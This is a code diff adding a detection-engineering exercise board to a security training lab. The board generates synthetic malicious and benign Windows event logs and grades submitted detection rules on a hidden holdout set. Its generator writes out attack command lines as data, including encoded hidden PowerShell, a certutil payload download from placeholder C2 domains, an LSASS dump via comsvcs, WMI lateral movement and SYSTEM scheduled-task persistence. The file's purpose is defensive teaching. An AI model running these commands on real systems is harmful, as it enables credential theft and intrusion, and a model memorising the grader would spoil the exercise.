@@ -14,6 +14,8 @@ score(scenario, sub).
 import datetime as _dt
 import random as _random
 
+import detect as _detect
+
 # --- board 1: SOC triage ----------------------------------------------------
 # GOAD-themed estate. Malicious alerts carry a technique whose raw log makes the
 # technique determinable; benign alerts are low-severity noise.
@@ -320,15 +322,235 @@ def score_board2(scenario, submission):
     return score, per_alert
 
 
+# --- board 3: detection engineering -----------------------------------------
+# The ranger is handed labeled malicious samples (the behaviors to detect) and a
+# benign baseline that includes near-miss decoys (a legit certutil, a legit
+# powershell, a legit schtasks query...). They author detection rules. We grade
+# by running those rules against a HOLDOUT corpus generated from the same seed:
+# fresh variants of the same techniques (new hosts, users, blobs, domains) plus
+# fresh benign. A rule that keys on the invariant tradecraft generalizes and
+# scores; a rule overfit to the sample string catches nothing in the holdout; a
+# lazy image-only rule gets punished by the near-miss benigns on precision.
+_B3_HOSTS = ["WKS-0471", "WKS-0088", "WKS-1120", "WKS-0233", "WKS-0355",
+             "SRV-APP01", "SRV-FILE02", "SRV-SQL03"]
+_B3_USERS = ["m.okafor", "s.petrov", "l.nguyen", "d.reyes", "a.haddad",
+             "k.yilmaz", "r.santos", "j.abara", "t.flores"]
+_B3_C2 = ["cdn-telemetry-sync.com", "updates-cache-cdn.net", "api-metrics-collector.io",
+          "static-assets-pool.co", "edge-node-telemetry.net", "mirror-pkg-delivery.net"]
+# The intrusion's techniques, in kill-chain order. Every seed must cover these.
+_B3_TECHNIQUES = ["T1059.001", "T1105", "T1087.002", "T1003.001",
+                  "T1047", "T1053.005", "T1071.001", "T1048.003"]
+_B3_TNAME = {
+    "T1059.001": "Encoded PowerShell from Office",
+    "T1105": "Ingress tool transfer (certutil)",
+    "T1087.002": "Domain account discovery",
+    "T1003.001": "LSASS dump via comsvcs",
+    "T1047": "WMI lateral movement",
+    "T1053.005": "Scheduled-task persistence",
+    "T1071.001": "Web C2 beaconing",
+    "T1048.003": "Exfiltration over DNS",
+}
+
+
+def _b3_tok(r, n):
+    return "".join(r.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(n))
+
+
+def _b3_mal(r, tech):
+    """A malicious event for a technique, with randomized but behavior-preserving
+    fields. The invariant tradecraft (image + command tokens) is what a good rule
+    keys on; everything else varies per instance."""
+    H, U, dst, dom = r.choice(_B3_HOSTS), r.choice(_B3_USERS), r.choice(_B3_HOSTS), r.choice(_B3_C2)
+    e = {"event_type": "process", "host": H, "user": U, "image": "", "parent": "",
+         "command": "", "dest": "", "domain": ""}
+    if tech == "T1059.001":
+        e.update(image="powershell.exe", parent=r.choice(["winword.exe", "excel.exe", "outlook.exe"]),
+                 command="powershell.exe -nop -w hidden -enc JAB%s==" % _b3_tok(r, 14))
+    elif tech == "T1105":
+        e.update(image="certutil.exe", parent="cmd.exe", domain=dom,
+                 command="certutil.exe -urlcache -split -f https://%s/%s.bin" % (dom, _b3_tok(r, 6)))
+    elif tech == "T1087.002":
+        e.update(image="net.exe", parent="cmd.exe",
+                 command=r.choice(['net.exe group "Domain Admins" /domain',
+                                   'net.exe group "Enterprise Admins" /domain']))
+    elif tech == "T1003.001":
+        e.update(image="rundll32.exe", parent="cmd.exe",
+                 command="rundll32.exe comsvcs.dll MiniDump %d C:\\ProgramData\\%s.dmp full"
+                         % (r.randint(500, 1500), _b3_tok(r, 5)))
+    elif tech == "T1047":
+        e.update(image="wmic.exe", parent="cmd.exe", dest=dst,
+                 command="wmic.exe /node:%s process call create \"cmd /c %s.bat\"" % (dst, _b3_tok(r, 5)))
+    elif tech == "T1053.005":
+        e.update(image="schtasks.exe", parent="cmd.exe",
+                 command="schtasks.exe /create /ru SYSTEM /tn %s /tr \"powershell -w hidden -f c:\\%s.ps1\" /sc onlogon"
+                         % (_b3_tok(r, 6), _b3_tok(r, 5)))
+    elif tech == "T1071.001":
+        e.update(event_type="network", dest=dom, domain=dom,
+                 command="HTTPS beacon to %s every 60s ~1.2KB over 8h" % dom)
+    elif tech == "T1048.003":
+        e.update(event_type="dns", domain=dom,
+                 command="240 TXT queries to %s, high-entropy labels, ~3MB over 20m" % dom)
+    return e
+
+
+# Benign builders, several of them deliberate near-misses for a specific
+# technique: they share the image but not the malicious command tokens, so an
+# image-only rule false-positives here and loses precision.
+def _b3_benign(r):
+    H, U, dst = r.choice(_B3_HOSTS), r.choice(_B3_USERS), r.choice(_B3_HOSTS)
+    choices = [
+        {"event_type": "process", "image": "certutil.exe", "parent": "cmd.exe",
+         "command": "certutil.exe -hashfile C:\\Users\\%s\\Downloads\\setup.exe SHA256" % U.split(".")[-1]},
+        {"event_type": "process", "image": "powershell.exe", "parent": "explorer.exe",
+         "command": "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\inventory.ps1"},
+        {"event_type": "process", "image": "net.exe", "parent": "cmd.exe",
+         "command": "net.exe use Z: \\\\SRV-FILE02\\shared"},
+        {"event_type": "process", "image": "rundll32.exe", "parent": "explorer.exe",
+         "command": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"},
+        {"event_type": "process", "image": "schtasks.exe", "parent": "cmd.exe",
+         "command": "schtasks.exe /query /fo LIST /v"},
+        {"event_type": "process", "image": "wmic.exe", "parent": "cmd.exe",
+         "command": "wmic.exe logicaldisk get caption,freespace"},
+        {"event_type": "process", "image": "outlook.exe", "parent": "explorer.exe",
+         "command": "outlook.exe"},
+        {"event_type": "process", "image": "msedge.exe", "parent": "explorer.exe",
+         "command": "msedge.exe --profile-directory=Default"},
+        {"event_type": "network", "dest": "windowsupdate.microsoft.com",
+         "domain": "windowsupdate.microsoft.com", "command": "HTTPS to windowsupdate.microsoft.com"},
+        {"event_type": "network", "dest": "outlook.office365.com",
+         "domain": "outlook.office365.com", "command": "HTTPS to outlook.office365.com"},
+        {"event_type": "dns", "domain": "teams.microsoft.com", "command": "A query teams.microsoft.com"},
+        {"event_type": "dns", "domain": "aka.ms", "command": "A query aka.ms"},
+    ]
+    e = {"event_type": "process", "host": H, "user": U, "image": "", "parent": "",
+         "command": "", "dest": "", "domain": ""}
+    e.update(r.choice(choices))
+    e["host"], e["user"] = H, U
+    return e
+
+
+def _b3_corpus(r, techniques, k_per_tech, benign_count):
+    corpus = []
+    for tech in techniques:
+        for _ in range(k_per_tech):
+            e = _b3_mal(r, tech)
+            e["_label"], e["_tech"] = "malicious", tech
+            corpus.append(e)
+    for _ in range(benign_count):
+        e = _b3_benign(r)
+        e["_label"], e["_tech"] = "benign", None
+        corpus.append(e)
+    r.shuffle(corpus)
+    return corpus
+
+
+def generate_board3(seed):
+    """The SHOWN requirements: one labeled sample per technique plus a benign
+    baseline (with near-miss decoys). Grading uses a hidden holdout derived from
+    the same seed, so nothing secret lives in what the ranger receives."""
+    r = _random.Random("board3:shown:" + str(seed))
+    techniques = list(_B3_TECHNIQUES)
+    threats = []
+    for tech in techniques:
+        e = _b3_mal(r, tech)
+        threats.append({"technique": tech, "name": _B3_TNAME[tech],
+                        "event_type": e["event_type"], "host": e["host"], "user": e["user"],
+                        "image": e["image"], "parent": e["parent"], "command": e["command"],
+                        "dest": e["dest"], "domain": e["domain"]})
+    baseline = []
+    for _ in range(14):
+        e = _b3_benign(r)
+        baseline.append({k: e[k] for k in ("event_type", "host", "user", "image",
+                                           "parent", "command", "dest", "domain")})
+    return {"board": 3, "_seed": str(seed), "_techniques": techniques,
+            "cohort_theme": "corp.local", "threats": threats, "baseline": baseline}
+
+
+def public_board3(scenario):
+    """Detection requirements. The malicious samples are intel (labeled on
+    purpose); the holdout they'll be graded on is never exposed."""
+    return {"board": 3, "theme": scenario["cohort_theme"],
+            "detectable_fields": sorted(_detect.FIELDS),
+            "threats": scenario["threats"], "baseline": scenario["baseline"]}
+
+
+def score_board3(scenario, submission):
+    """Compile the ruleset and run it against a seeded holdout. Score is the F1
+    of macro-recall (mean per-technique detection, so no technique can be
+    skipped) and precision (benign events must stay quiet). Feedback is
+    validation metrics and per-rule firing counts, never the holdout contents."""
+    seed = scenario.get("_seed", "")
+    techniques = scenario.get("_techniques", list(_B3_TECHNIQUES))
+    holdout = _b3_corpus(_random.Random("board3:holdout:" + seed), techniques,
+                         k_per_tech=4, benign_count=60)
+
+    rules = submission.get("rules") if isinstance(submission, dict) else None
+    matchers, errors = _detect.compile_ruleset(rules or [])
+
+    mal = [e for e in holdout if e["_label"] == "malicious"]
+    ben = [e for e in holdout if e["_label"] == "benign"]
+    per_rule = {name: {"malicious": 0, "benign": 0} for name, _ in matchers}
+
+    def detected(ev):
+        hit = False
+        for name, fn in matchers:
+            try:
+                if fn(ev):
+                    hit = True
+                    per_rule[name]["malicious" if ev["_label"] == "malicious" else "benign"] += 1
+            except _detect.RuleError:
+                pass
+        return hit
+
+    det_mal = {t: 0 for t in techniques}
+    tot_mal = {t: 0 for t in techniques}
+    for e in mal:
+        tot_mal[e["_tech"]] += 1
+        if detected(e):
+            det_mal[e["_tech"]] += 1
+    fp = sum(1 for e in ben if detected(e))
+
+    per_tech_recall = [(det_mal[t] / tot_mal[t]) if tot_mal[t] else 1.0 for t in techniques]
+    macro_recall = sum(per_tech_recall) / len(per_tech_recall) if per_tech_recall else 0.0
+    total_det_mal = sum(det_mal.values())
+    precision = (total_det_mal / (total_det_mal + fp)) if (total_det_mal + fp) else 0.0
+    f1 = (2 * macro_recall * precision / (macro_recall + precision)) if (macro_recall + precision) else 0.0
+    score = round(100.0 * f1, 1)
+
+    covered = sum(1 for t in techniques if det_mal[t] > 0)
+    feedback = {
+        "techniques_covered": "%d/%d" % (covered, len(techniques)),
+        "validation_false_positives": fp,
+        "macro_recall": round(macro_recall, 3),
+        "precision": round(precision, 3),
+        "rules": [{"name": n, "fired_malicious": per_rule[n]["malicious"],
+                   "fired_benign": per_rule[n]["benign"]} for n, _ in matchers],
+        "rule_errors": errors,
+    }
+    # Shape the second return value like a per-item list so the API stays uniform.
+    return score, [feedback]
+
+
 # --- dispatch ---------------------------------------------------------------
 _GENERATORS = {
     1: (generate_board1, public_board1, score_board1),
     2: (generate_board2, public_board2, score_board2),
+    3: (generate_board3, public_board3, score_board3),
 }
+
+
+# What kind of exercise each board is, so the lab client knows what file to
+# scaffold and submit. "triage": per-event verdicts (triage.yml). "detection":
+# a detection ruleset (rules.yml).
+_KINDS = {1: "triage", 2: "triage", 3: "detection"}
 
 
 def has_board(n):
     return n in _GENERATORS
+
+
+def kind(n):
+    return _KINDS.get(n, "triage")
 
 
 def dataset(n, seed):
